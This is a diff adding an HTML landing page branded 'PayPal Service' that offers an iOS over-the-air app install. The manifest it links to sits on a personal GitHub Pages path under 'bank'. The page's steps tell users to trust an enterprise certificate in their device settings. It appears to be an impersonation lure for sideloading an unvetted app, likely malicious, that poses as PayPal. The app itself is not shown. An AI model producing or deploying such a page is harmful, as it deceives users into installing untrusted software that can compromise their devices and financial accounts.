@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Install Paypal Service</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: #002e93;
+      color: #fff;
+      font-family: -apple-system, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+      text-align: center;
+    }
+    img {
+      width: 120px;
+      height: 120px;
+      border-radius: 26px;
+      margin-bottom: 24px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+    }
+    h1 { font-size: 28px; font-weight: 700; margin-bottom: 8px; }
+    .version { font-size: 15px; color: rgba(255,255,255,0.6); margin-bottom: 8px; }
+    .desc { font-size: 15px; color: rgba(255,255,255,0.5); margin-bottom: 40px; }
+    a.install-btn {
+      background: #fff;
+      color: #002e93;
+      padding: 16px 56px;
+      border-radius: 14px;
+      font-size: 17px;
+      font-weight: 700;
+      text-decoration: none;
+      display: inline-block;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+    }
+    .note {
+      margin-top: 28px;
+      font-size: 13px;
+      color: rgba(255,255,255,0.35);
+    }
+    .steps {
+      margin-top: 40px;
+      text-align: left;
+      background: rgba(255,255,255,0.08);
+      border-radius: 16px;
+      padding: 20px 24px;
+      max-width: 320px;
+      width: 100%;
+    }
+    .steps p {
+      font-size: 13px;
+      color: rgba(255,255,255,0.6);
+      margin-bottom: 8px;
+      padding-left: 8px;
+    }
+    .steps h3 {
+      font-size: 13px;
+      font-weight: 700;
+      color: rgba(255,255,255,0.5);
+      margin-bottom: 12px;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+    }
+  </style>
+</head>
+<body>
+  <img src="icon512.png" alt="PayPal Service Icon"/>
+  <h1>PayPal Service</h1>
+  <p class="version">Version 1.0.0</p>
+  <p class="desc">Fast and secure mobile payments</p>
+  <a class="install-btn"
+     href="itms-services://?action=download-manifest&url=https://jimcooks211.github.io/bank/ota/manifest.plist">
+    Install App
+  </a>
+  <p class="note">Open in Safari on your iPhone to install</p>
+  <div class="steps">
+    <h3>How to install</h3>
+    <p>1. Open this page in Safari</p>
+    <p>2. Tap Install App above</p>
+    <p>3. Tap Install on the prompt</p>
+    <p>4. Go to Settings ? General ? VPN & Device Management ? Trust the certificate</p>
+  </div>
+</body>
+</html>
